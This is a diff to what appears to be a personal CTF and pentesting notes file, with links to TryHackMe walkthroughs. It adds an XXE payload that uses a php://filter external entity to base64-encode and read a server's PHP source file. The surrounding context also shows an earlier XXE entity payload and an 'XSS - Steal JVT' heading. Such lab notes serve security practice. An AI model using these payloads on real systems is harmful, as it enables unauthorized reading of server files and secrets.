@@ -291,7 +291,7 @@ Content-Length: 91
 
 **Examples**
 
-[mustacchio.md](../../walkthroughs/tryhackme/mustacchio.md "mention")
+[mustacchio.md](../../walkthroughs/tryhackme/mustacchio.md "mention")[#xee-read-files](../../walkthroughs/tryhackme/battery.md#xee-read-files "mention")
 
 **Input**
 
@@ -304,6 +304,16 @@ Content-Length: 91
   <com>&xxe;</com>
 </comment>
 ```
+
+Base64 encode the file
+
+```
+<!DOCTYPE replace [<!ENTITY test SYSTEM "php://filter/convert.base64-encode/resource=acc.php"> ]>
+
+<search>&test;</search>
+```
+
+##
 
 ## XSS - Steal JVT
 
